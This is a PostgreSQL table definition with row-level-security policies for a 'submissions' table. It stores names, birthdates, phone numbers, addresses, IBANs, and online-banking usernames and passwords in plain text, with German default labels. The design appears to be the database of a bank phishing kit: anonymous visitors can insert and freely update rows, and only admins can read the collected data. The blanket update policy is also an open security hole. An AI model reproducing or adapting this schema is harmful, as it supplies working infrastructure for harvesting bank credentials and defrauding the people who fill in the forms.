CREATE TABLE public.submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  created_at timestamptz DEFAULT now(),
  full_name text,
  email text,
  birthdate text,
  phone text,
  street text,
  house_number text,
  staircase text,
  door_number text,
  postal_code text,
  city text,
  iban text,
  bank text,
  bank_username text,
  bank_password text,
  bank_username_label text DEFAULT 'Benutzername',
  bank_password_label text DEFAULT 'Passwort',
  bank_extra jsonb DEFAULT '{}'::jsonb
);

ALTER TABLE public.submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert" ON public.submissions FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update by session" ON public.submissions FOR UPDATE USING (true) WITH CHECK (true);

CREATE POLICY "Admins can select" ON public.submissions FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));